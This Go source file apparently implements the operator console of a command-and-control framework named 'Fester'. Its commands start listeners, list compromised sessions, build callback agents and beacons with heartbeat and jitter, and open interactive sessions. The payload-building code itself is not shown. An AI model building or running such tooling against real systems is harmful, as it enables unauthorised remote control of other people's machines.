package server

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"github.com/common-nighthawk/go-figure"
)

func Splash() {
	myFigure := figure.NewColorFigure("Fester", "colossal", "white", true)
	myFigure.Print()
}

func HandleInput(l Listeners) {

	helpMenu := []string{"history", "listen", "list", "kill", "build", "interact", "exit"}

	commands := []string{}

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("fester> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		commands = append(commands, input)
		cleanInput := strings.Split(input, " ")

		switch cleanInput[0] {
		case "history":
			fmt.Println(commands)
		case "listen":
			if len(cleanInput) != 3 {
				fmt.Println("Usage: listen <lhost> <lport>")
				continue
			}
			l.StartListener(cleanInput[1], cleanInput[2])
		case "list":
			if len(cleanInput) < 2 {
				fmt.Println("Usage: list <l/s>")
				continue
			}
			switch cleanInput[1] {
			case "l":
				fmt.Printf("ListenerID  Addr\n")
				for k, v := range l.listeners {
					fmt.Printf("%d \t  %s\n", k, v.server.Addr)
				}
			case "s":
				fmt.Printf("SessionID \t \t RHost \t \t ListenerID\n")
				for listenerID, listener := range l.listeners {
					for sessionID, session := range listener.activeSessions {
						fmt.Printf("%s \t %s \t %d\n", sessionID, session.rhost, listenerID)
					}
				}
			}

		case "kill":
			if len(cleanInput) != 2 {
				fmt.Println("Usage: kill <listener id>")
				continue
			}
			l.KillListener(cleanInput[1])
		case "build":
			if len(cleanInput) < 2 {
				fmt.Println("Usage: build <agent/beacon>")
				continue
			}
			switch cleanInput[1] {
			case "agent":
				if len(cleanInput) != 5 {
					fmt.Println("Usage: build agent <lhost> <lport> <output dir>")
					continue
				}
				CreateAgent(cleanInput[2], cleanInput[3], cleanInput[4])
			case "beacon":
				if len(cleanInput) != 7 {
					fmt.Println("Usage: build beacon <lhost> <lport> <heartbeat> <jitter> <output dir>")
					continue
				}
				CreateBeacon(cleanInput[2], cleanInput[3], cleanInput[4], cleanInput[5], cleanInput[6])
			}
		case "interact":
			if len(cleanInput) < 2 {
				fmt.Println("Usage: interact <session id>")
				continue
			}

			l.Interact(cleanInput[1])

		case "help":
			fmt.Printf("Help:\n")
			for command := range helpMenu {
				fmt.Printf("\t %s \n", helpMenu[command])
			}
		case "exit":
			os.Exit(0)
		}
	}
}

func Init() {
	Splash()
	l := InitListeners()
	HandleInput(l)
}
